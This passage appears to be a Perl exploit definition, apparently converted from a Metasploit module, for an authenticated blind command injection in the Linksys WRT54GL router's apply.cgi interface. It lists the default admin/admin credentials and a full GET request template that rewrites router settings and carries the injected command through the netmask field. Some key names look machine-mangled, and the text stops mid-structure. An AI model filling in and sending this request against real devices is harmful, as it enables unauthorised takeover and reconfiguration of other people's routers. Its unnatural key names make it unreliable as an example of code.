my $EXPLOIT = {
  "DESCRIPTION" => "

          Some Linksys Routers are vulnerable to an authenticated OS command injection in

        the Web Interface. Default credentials are admin/admin or admin/password. Since it

        is a blind os command injection vulnerability, there is no output for the executed

        command when using the cmd generic payload. A ping command against a controlled

        system could be used for testing purposes. The user must be prudent when using this

        module since it modifies the router configuration while exploitation, even when it

        tries to restore previous values.

      ",
  "METHOD" => "GET",
  "MSF_MODULE" => "linksys_wrt54gl_apply_exec",
  "OSVDB" => 89912,
  "PATH" => "",
  "PATHS" => ["index.asp"],
  "PAYLOAD" => "?submit_button=index&change_action=1&submit_type=1&action=Apply&now_proto=__NOW_PROTO__&daylight_time=__DAYLIGHT_TIME__&lan_ipaddr=__LAN_IPADDR__&wait_time=__WAIT_TIME__&need_reboot=__NEED_REBOOT__&ui_language=__UI_LANGUAGE__&wan_proto=__WAN_PROTO__&router_name=__ROUTER_NAME__&wan_hostname=__WAN_HOSTNAME__&wan_domain=__WAN_DOMAIN__&mtu_enable=__MTU_ENABLE__&wan_mtu=__WAN_MTU__&lan_ipaddr_0=__LAN_IPADDR_0__&lan_ipaddr_1=__LAN_IPADDR_1__&lan_ipaddr_2=__LAN_IPADDR_2__&lan_ipaddr_3=__LAN_IPADDR_3__&lan_netmask=255.255.255.__\\\@NETMASK_ORIG__&lan_proto=__LAN_PROTO__&dhcp_check=1&dhcp_start=__DHCP_START__&dhcp_num=__DHCP_NUM__&dhcp_lease=__DHCP_LEASE__&wan_dns=__WAN_DNS__&wan_dns0_0=__WAN_DNS0_0__&wan_dns0_1=__WAN_DNS0_1__&wan_dns0_2=__WAN_DNS0_2__&wan_dns0_3=__WAN_DNS0_3__&wan_dns1_0=__WAN_DNS1_0__&wan_dns1_1=__WAN_DNS1_1__&wan_dns1_2=__WAN_DNS1_2__&wan_dns1_3=__WAN_DNS1_3__&wan_dns2_0=__WAN_DNS2_0__&wan_dns2_1=__WAN_DNS2_1__&wan_dns2_2=__WAN_DNS2_2__&wan_dns2_3=__WAN_DNS2_3__&wan_wins=__WAN_WINS__&wan_wins_0=__WAN_WINS_0__&wan_wins_1=__WAN_WINS_1__&wan_wins_2=__WAN_WINS_2__&wan_wins_3=__WAN_WINS_3__&time_zone=-08+1+1&#defaultisok_daylight_time=1#defaultisok&",
  "REFERENCES" => ["http://www.s3cur1ty.de/m1adv2013-001"],
  "THE PASSWORD FOR THE SPECIFIED USERTITLE" => "admin",
  "THE USERTITLE TO AUTHENTICATE AS" => "admin",
  "TITLE" => "Linksys WRT54GL apply.cgi Command Execution",
  VARIABLES => {
    'LAN_IPADDR_1' =>       { DESCRIPTION => "", VALUE => "" },
    'LAN_IPADDR_2' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_WINS' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_WINS_2' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS1_2' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_MTU' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS0_3' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DOMAIN' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_WINS_3' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS1_0' =>       { DESCRIPTION => "", VALUE => "" },
    'DHCP_START' =>       { DESCRIPTION => "", VALUE => "" },
    'MTU_ENABLE' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS0_1' =>       { DESCRIPTION => "", VALUE => "" },
    'LAN_PROTO' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS2_1' =>       { DESCRIPTION => "", VALUE => "" },
    'DHCP_LEASE' =>       { DESCRIPTION => "", VALUE => "" },
    'LAN_IPADDR' =>       { DESCRIPTION => "", VALUE => "" },
    'DAYLIGHT_TIME' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS0_0' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS' =>       { DESCRIPTION => "", VALUE => "" },
    'UI_LANGUAGE' =>       { DESCRIPTION => "", VALUE => "" },
    'NOW_PROTO' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_WINS_0' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_PROTO' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS0_2' =>       { DESCRIPTION => "", VALUE => "" },
    'ROUTER_NAME' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS2_3' =>       { DESCRIPTION => "", VALUE => "" },
    'DHCP_NUM' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS2_0' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS1_1' =>       { DESCRIPTION => "", VALUE => "" },
    'NEED_REBOOT' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_WINS_1' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS1_3' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_HOSTNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'WAIT_TIME' =>       { DESCRIPTION => "", VALUE => "" },
    'LAN_IPADDR_0' =>       { DESCRIPTION => "", VALUE => "" },
    'LAN_IPADDR_3' =>       { DESCRIPTION => "", VALUE => "" },
    'WAN_DNS2_2' =>       { DESCRIPTION => "", VALUE => "" },
  },
